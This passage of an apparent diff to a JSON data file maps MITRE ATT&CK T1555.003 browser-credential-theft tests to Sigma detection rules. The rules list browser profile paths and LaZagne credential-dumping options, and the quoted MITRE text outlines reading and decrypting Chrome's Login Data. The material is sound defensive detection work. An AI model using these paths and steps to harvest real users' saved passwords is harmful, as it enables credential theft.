mi '\n              - ' mv '\n        - Image|endswith:\n              - '\\xcopy.exe'\n              - '\\robocopy.exe'\n        - OriginalFileName:\n              - 'XCOPY.EXE'\n              - 'robocopy.exe'\n    selection_path:\n        CommandLine|contains:\n            - '\\Amigo\\User Data'\n            - '\\BraveSoftware\\Brave-Browser\\User Data'\n            - '\\CentBrowser\\User Data'\n            - '\\Chromium\\User Data'\n            - '\\CocCoc\\Browser\\User Data'\n            - '\\Comodo\\Dragon\\User Data'\n            - '\\Elements Browser\\User Data'\n            - '\\Epic Privacy Browser\\User Data'\n            - '\\Google\\Chrome Beta\\User Data'\n            - '\\Google\\Chrome SxS\\User Data'\n            - '\\Google\\Chrome\\User Data\\'\n            - '\\Kometa\\User Data'\n            - '\\Maxthon5\\Users'\n            - '\\Microsoft\\Edge\\User Data'\n            - '\\Mozilla\\Firefox\\Profiles'\n            - '\\Nichrome\\User Data'\n            - '\\Opera Software\\Opera GX Stable\\'\n            - '\\Opera Software\\Opera Neon\\User Data'\n            - '\\Opera Software\\Opera Stable\\'\n            - '\\Orbitum\\User Data'\n            - '\\QIP Surf\\User Data'\n            - '\\Sputnik\\User Data'\n            - '\\Torch\\User Data'\n            - '\\uCozMedia\\Uran\\User Data'\n            - '\\Vivaldi\\User Data'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Copy From or To System Directory",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir.yml",
+                        "remote_content": "title: Suspicious Copy From or To System Directory\nid: fff9d2b7-e11c-4a69-93d3-40ef66189767\nrelated:\n    - id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900\n      type: derived\nstatus: test\ndescription: |\n    Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\n    Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\nreferences:\n    - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120\n    - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html\n    - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/\nauthor: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-07-03\nmodified: 2023-08-29\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n              - '\\robocopy.exe'\n              - '\\xcopy.exe'\n        - OriginalFileName:\n              - 'robocopy.exe'\n              - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n            - '\\WinSxS'\n    condition: 1 of selection_* and target\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1555.003",
+                "atomic_attack_guid": "28498c17-57e4-495a-b0be-cc1e36de408b",
+                "atomic_attack_name": "Simulating access to Opera Login Data",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potential Browser Data Stealing",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_browser_data.yml",
+                        "remote_content": "title: Potential Browser Data Stealing\nid: 47147b5b-9e17-4d76-b8d2-7bac24c5ce1b\nrelated:\n    - id: fc028194-969d-4122-8abe-0470d5b8f12f\n      type: derived\nstatus: test\ndescription: |\n    Adversaries may acquire credentials from web browsers by reading files specific to the target browser.\n    Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future.\n    Web browsers typically store the credentials in an encrypted format within a credential store.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555.003/T1555.003.md\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-23\nmodified: 2023-08-29\ntags:\n    - attack.credential-access\n    - attack.t1555.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        - CommandLine|contains:\n              - 'copy-item'\n              - 'copy '\n              - 'cpi '\n              - ' cp '\n              - 'move '\n              - 'move-item'\n              - ' mi '\n              - ' mv '\n        - Image|endswith:\n              - '\\xcopy.exe'\n              - '\\robocopy.exe'\n        - OriginalFileName:\n              - 'XCOPY.EXE'\n              - 'robocopy.exe'\n    selection_path:\n        CommandLine|contains:\n            - '\\Amigo\\User Data'\n            - '\\BraveSoftware\\Brave-Browser\\User Data'\n            - '\\CentBrowser\\User Data'\n            - '\\Chromium\\User Data'\n            - '\\CocCoc\\Browser\\User Data'\n            - '\\Comodo\\Dragon\\User Data'\n            - '\\Elements Browser\\User Data'\n            - '\\Epic Privacy Browser\\User Data'\n            - '\\Google\\Chrome Beta\\User Data'\n            - '\\Google\\Chrome SxS\\User Data'\n            - '\\Google\\Chrome\\User Data\\'\n            - '\\Kometa\\User Data'\n            - '\\Maxthon5\\Users'\n            - '\\Microsoft\\Edge\\User Data'\n            - '\\Mozilla\\Firefox\\Profiles'\n            - '\\Nichrome\\User Data'\n            - '\\Opera Software\\Opera GX Stable\\'\n            - '\\Opera Software\\Opera Neon\\User Data'\n            - '\\Opera Software\\Opera Stable\\'\n            - '\\Orbitum\\User Data'\n            - '\\QIP Surf\\User Data'\n            - '\\Sputnik\\User Data'\n            - '\\Torch\\User Data'\n            - '\\uCozMedia\\Uran\\User Data'\n            - '\\Vivaldi\\User Data'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Copy From or To System Directory",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir.yml",
+                        "remote_content": "title: Suspicious Copy From or To System Directory\nid: fff9d2b7-e11c-4a69-93d3-40ef66189767\nrelated:\n    - id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900\n      type: derived\nstatus: test\ndescription: |\n    Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\n    Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\nreferences:\n    - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120\n    - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html\n    - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/\nauthor: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-07-03\nmodified: 2023-08-29\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n              - '\\robocopy.exe'\n              - '\\xcopy.exe'\n        - OriginalFileName:\n              - 'robocopy.exe'\n              - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n            - '\\WinSxS'\n    condition: 1 of selection_* and target\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1555.003",
+                "atomic_attack_guid": "3d111226-d09a-4911-8715-fe11664f960d",
+                "atomic_attack_name": "Simulating access to Chrome Login Data",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potential Browser Data Stealing",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_browser_data.yml",
+                        "remote_content": "title: Potential Browser Data Stealing\nid: 47147b5b-9e17-4d76-b8d2-7bac24c5ce1b\nrelated:\n    - id: fc028194-969d-4122-8abe-0470d5b8f12f\n      type: derived\nstatus: test\ndescription: |\n    Adversaries may acquire credentials from web browsers by reading files specific to the target browser.\n    Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future.\n    Web browsers typically store the credentials in an encrypted format within a credential store.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555.003/T1555.003.md\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-23\nmodified: 2023-08-29\ntags:\n    - attack.credential-access\n    - attack.t1555.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        - CommandLine|contains:\n              - 'copy-item'\n              - 'copy '\n              - 'cpi '\n              - ' cp '\n              - 'move '\n              - 'move-item'\n              - ' mi '\n              - ' mv '\n        - Image|endswith:\n              - '\\xcopy.exe'\n              - '\\robocopy.exe'\n        - OriginalFileName:\n              - 'XCOPY.EXE'\n              - 'robocopy.exe'\n    selection_path:\n        CommandLine|contains:\n            - '\\Amigo\\User Data'\n            - '\\BraveSoftware\\Brave-Browser\\User Data'\n            - '\\CentBrowser\\User Data'\n            - '\\Chromium\\User Data'\n            - '\\CocCoc\\Browser\\User Data'\n            - '\\Comodo\\Dragon\\User Data'\n            - '\\Elements Browser\\User Data'\n            - '\\Epic Privacy Browser\\User Data'\n            - '\\Google\\Chrome Beta\\User Data'\n            - '\\Google\\Chrome SxS\\User Data'\n            - '\\Google\\Chrome\\User Data\\'\n            - '\\Kometa\\User Data'\n            - '\\Maxthon5\\Users'\n            - '\\Microsoft\\Edge\\User Data'\n            - '\\Mozilla\\Firefox\\Profiles'\n            - '\\Nichrome\\User Data'\n            - '\\Opera Software\\Opera GX Stable\\'\n            - '\\Opera Software\\Opera Neon\\User Data'\n            - '\\Opera Software\\Opera Stable\\'\n            - '\\Orbitum\\User Data'\n            - '\\QIP Surf\\User Data'\n            - '\\Sputnik\\User Data'\n            - '\\Torch\\User Data'\n            - '\\uCozMedia\\Uran\\User Data'\n            - '\\Vivaldi\\User Data'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Copy From or To System Directory",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir.yml",
+                        "remote_content": "title: Suspicious Copy From or To System Directory\nid: fff9d2b7-e11c-4a69-93d3-40ef66189767\nrelated:\n    - id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900\n      type: derived\nstatus: test\ndescription: |\n    Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\n    Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\nreferences:\n    - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120\n    - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html\n    - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/\nauthor: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-07-03\nmodified: 2023-08-29\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n              - '\\robocopy.exe'\n              - '\\xcopy.exe'\n        - OriginalFileName:\n              - 'robocopy.exe'\n              - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n            - '\\WinSxS'\n    condition: 1 of selection_* and target\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1555.003",
+                "atomic_attack_guid": "9a2915b3-3954-4cce-8c76-00fbf4dbd014",
+                "atomic_attack_name": "LaZagne - Credentials from Browser",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "HackTool - LaZagne Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_lazagne.yml",
+                        "remote_content": "title: HackTool - LaZagne Execution\nid: c2b86e67-b880-4eec-b045-50bc98ef4844\nstatus: experimental\ndescription: |\n    Detects the execution of the LaZagne. A utility used to retrieve multiple types of passwords stored on a local computer.\n    LaZagne has been leveraged multiple times by threat actors in order to dump credentials.\nreferences:\n    - https://github.com/AlessandroZ/LaZagne/tree/master\n    - https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\n    - https://cloud.google.com/blog/topics/threat-intelligence/alphv-ransomware-backup/\n    - https://securelist.com/defttorero-tactics-techniques-and-procedures/107610/\n    - https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/800c0e06571993a54e39571cf27fd474dcc5c0bc/2017/2017.11.14.Muddying_the_Water/muddying-the-water-targeted-attacks.pdf\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-06-24\nmodified: 2024-08-16\ntags:\n    - attack.credential-access\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        Image|endswith: '\\lazagne.exe'\n    selection_clionly:\n        # Note: This selection can be prone to FP. An initial baseline is required\n        Image|contains:\n            - ':\\PerfLogs\\'\n            - ':\\ProgramData\\'\n            - ':\\Temp\\'\n            - ':\\Tmp\\'\n            - ':\\Windows\\Temp\\'\n            - '\\AppData\\'\n            - '\\Downloads\\'\n            - '\\Users\\Public\\'\n        CommandLine|endswith:\n            - '.exe all'\n            - '.exe browsers'\n            - '.exe chats'\n            - '.exe databases'\n            - '.exe games'\n            - '.exe git'\n            - '.exe mails'\n            - '.exe maven'\n            - '.exe memory'\n            - '.exe multimedia'\n            # - '.exe php' # Might be prone to FP\n            # - '.exe svn' # Might be prone to FP\n            - '.exe sysadmin'\n            - '.exe unused'\n            - '.exe wifi'\n            - '.exe windows'\n    selection_cli_modules:\n        CommandLine|contains:\n            - 'all '\n            - 'browsers '\n            - 'chats '\n            - 'databases '\n            - 'games '\n            - 'git '\n            - 'mails '\n            - 'maven '\n            - 'memory '\n            - 'multimedia '\n            - 'php '\n            - 'svn '\n            - 'sysadmin '\n            - 'unused '\n            - 'wifi '\n            - 'windows '\n    selection_cli_options:\n        CommandLine|contains:\n            - '-oA'\n            - '-oJ'\n            - '-oN'\n            - '-output'\n            - '-password'\n            - -1Password\n            - '-apachedirectorystudio'\n            - '-autologon'\n            - '-ChromiumBased'\n            - '-composer'\n            - '-coreftp'\n            - '-credfiles'\n            - '-credman'\n            - '-cyberduck'\n            - '-dbvis'\n            - '-EyeCon'\n            - '-filezilla'\n            - '-filezillaserver'\n            - '-ftpnavigator'\n            - '-galconfusion'\n            - '-gitforwindows'\n            - '-hashdump'\n            - '-iisapppool'\n            - '-IISCentralCertP'\n            - '-kalypsomedia'\n            - '-keepass'\n            - '-keepassconfig'\n            - '-lsa_secrets'\n            - '-mavenrepositories'\n            - '-memory_dump'\n            - '-Mozilla'\n            - '-mRemoteNG'\n            - '-mscache'\n            - '-opensshforwindows'\n            - '-openvpn'\n            - '-outlook'\n            - '-pidgin'\n            - '-postgresql'\n            - '-psi-im'\n            - '-puttycm'\n            - '-pypykatz'\n            - '-Rclone'\n            - '-rdpmanager'\n            - '-robomongo'\n            - '-roguestale'\n            - '-skype'\n            - '-SQLDeveloper'\n            - '-squirrel'\n            - '-tortoise'\n            - '-turba'\n            - '-UCBrowser'\n            - '-unattended'\n            - '-vault'\n            - '-vaultfiles'\n            - '-vnc'\n            - '-windows'\n            - '-winscp'\n            - '-wsl'\n    condition: selection_img or selection_clionly or (selection_cli_modules and selection_cli_options)\nfalsepositives:\n    - Some false positive is expected from tools with similar command line flags.\n# Note: Increase the level to \"high\" after an initial baseline\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1555.003",
+                "atomic_attack_guid": "8c05b133-d438-47ca-a630-19cc464c4622",
+                "atomic_attack_name": "Run Chrome-password Collector",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potential Execution of Sysinternals Tools",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_eula_accepted.yml",
+                        "remote_content": "title: Potential Execution of Sysinternals Tools\nid: 7cccd811-7ae9-4ebe-9afd-cb5c406b824b\nrelated:\n    - id: 25ffa65d-76d8-4da5-a832-3f2b0136e133\n      type: derived\nstatus: test\ndescription: Detects command lines that contain the 'accepteula' flag which could be a sign of execution of one of the Sysinternals tools\nreferences:\n    - https://twitter.com/Moti_B/status/1008587936735035392\nauthor: Markus Neis\ndate: 2017-08-28\nmodified: 2024-03-13\ntags:\n    - attack.resource-development\n    - attack.t1588.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|windash: ' -accepteula'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SysInternals tools\n    - Programs that use the same command line flag\nlevel: low\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "d0dae994-26c6-4d2d-83b5-b3c8b79ae513",
+                    "47147b5b-9e17-4d76-b8d2-7bac24c5ce1b",
+                    "58a3e6aa-4453-4cc8-a51f-4befe80b31a8",
+                    "24c77512-782b-448a-8950-eddb0785fc71",
+                    "cdc842aa-761d-48e2-9b97-c344bed8b3a8",
+                    "fc028194-969d-4122-8abe-0470d5b8f12f"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "d0dae994-26c6-4d2d-83b5-b3c8b79ae513",
+                        "lookup_data": {
+                            "description": "Detect use of WebBrowserPassView.exe",
+                            "raw": "author: frack113\ndate: 2022/08/20\ndescription: Detect use of WebBrowserPassView.exe\ndetection:\n  condition: selection\n  selection:\n  - Description: Web Browser Password Viewer\n  - Image|endswith: \\WebBrowserPassView.exe\nfalsepositives:\n- Legitimate use\nid: d0dae994-26c6-4d2d-83b5-b3c8b79ae513\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1555.003/T1555.003.md\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1555.003\ntitle: Launch WebBrowserPassView Executable\n",
+                            "sigma:id": "d0dae994-26c6-4d2d-83b5-b3c8b79ae513",
+                            "title": "Launch WebBrowserPassView Executable",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "47147b5b-9e17-4d76-b8d2-7bac24c5ce1b",
+                        "lookup_data": {
+                            "description": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.\nWeb browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future.\nWeb browsers typically store the credentials in an encrypted format within a credential store.\n",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/12/23\ndescription: 'Adversaries may acquire credentials from web browsers by reading files\n  specific to the target browser.\n\n  Web browsers commonly save credentials such as website usernames and passwords so\n  that they do not need to be entered manually in the future.\n\n  Web browsers typically store the credentials in an encrypted format within a credential\n  store.\n\n  '\ndetection:\n  condition: all of selection_*\n  selection_cmd:\n  - CommandLine|contains:\n    - copy-item\n    - 'copy '\n    - 'cpi '\n    - ' cp '\n    - 'move '\n    - move-item\n    - ' mi '\n    - ' mv '\n  - Image|endswith:\n    - \\xcopy.exe\n    - \\robocopy.exe\n  - OriginalFileName:\n    - XCOPY.EXE\n    - robocopy.exe\n  selection_path:\n    CommandLine|contains:\n    - \\Opera Software\\Opera Stable\\\n    - \\Mozilla\\Firefox\\Profiles\n    - \\Microsoft\\Edge\\User Data\\\n    - \\Google\\Chrome\\User Data\\\nfalsepositives:\n- Unknown\nid: 47147b5b-9e17-4d76-b8d2-7bac24c5ce1b\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/29\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1555.003/T1555.003.md\nrelated:\n- id: fc028194-969d-4122-8abe-0470d5b8f12f\n  type: derived\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1555.003\ntitle: Potential Browser Data Stealing\n",
+                            "sigma:id": "47147b5b-9e17-4d76-b8d2-7bac24c5ce1b",
+                            "title": "Potential Browser Data Stealing",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "58a3e6aa-4453-4cc8-a51f-4befe80b31a8",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1555.003",
+                            "mitre-cti:description": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
+                            "mitre-cti:name": "Credentials from Web Browsers",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Ryan Benson, Exabeam', 'Barry Shteiman, Exabeam', 'Sylvain Gil, Exabeam', 'RedHuntLabs, @redhuntlabs'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--58a3e6aa-4453-4cc8-a51f-4befe80b31a8', 'type': 'attack-pattern', 'created': '2020-02-12T18:57:36.041Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1555.003', 'url': 'https://attack.mitre.org/techniques/T1555/003'}, {'source_name': 'Talos Olympic Destroyer 2018', 'url': 'https://blog.talosintelligence.com/2018/02/olympic-destroyer.html', 'description': 'Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer Takes Aim At Winter Olympics. Retrieved March 14, 2019.'}, {'source_name': 'Microsoft CryptUnprotectData April 2018', 'url': 'https://docs.microsoft.com/en-us/windows/desktop/api/dpapi/nf-dpapi-cryptunprotectdata', 'description': 'Microsoft. (2018, April 12). CryptUnprotectData function. Retrieved June 18, 2019.'}, {'source_name': 'Proofpoint Vega Credential Stealer May 2018', 'url': 'https://www.proofpoint.com/us/threat-insight/post/new-vega-stealer-shines-brightly-targeted-campaign', 'description': 'Proofpoint. (2018, May 10). New Vega Stealer shines brightly in targeted campaign . Retrieved June 18, 2019.'}, {'source_name': 'FireEye HawkEye Malware July 2017', 'url': 'https://www.fireeye.com/blog/threat-research/2017/07/hawkeye-malware-distributed-in-phishing-campaign.html', 'description': 'Swapnil Patil, Yogesh Londhe. (2017, July 25). HawkEye Credential Theft Malware Distributed in Recent Phishing Campaign. Retrieved June 18, 2019.'}, {'source_name': 'GitHub Mimikittenz July 2016', 'url': 'https://github.com/putterpanda/mimikittenz', 'description': \"Jamieson O'Reilly (putterpanda). (2016, July 4). mimikittenz. Retrieved June 20, 2019.\"}], 'modified': '2022-02-15T19:29:57.405Z', 'name': 'Credentials from Web Browsers', 'description': \"Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\\n\\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)\\n \\nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\\n\\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\\n\\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).\", 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}], 'x_mitre_detection': 'Identify web browser files that contain credentials such as Google Chrome’s Login Data database file: <code>AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data</code>. Monitor file read events of web browser files that contain credentials, especially when the reading process is unrelated to the subject web browser. Monitor process execution logs to include PowerShell Transcription focusing on those that perform a combination of behaviors including reading web browser process memory, utilizing regular expressions, and those that contain numerous keywords for common web applications (Gmail, Twitter, Office365, etc.).', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.1', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['File: File Access', 'Process: OS API Execution', 'Process: Process Access', 'Command: Command Execution'], 'x_mitre_permissions_required': ['User']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "24c77512-782b-448a-8950-eddb0785fc71",
+                        "lookup_data": {
+                            "description": "Detect usage of the \"sqlite\" binary to query databases in Chromium-based browsers for potential data stealing.",
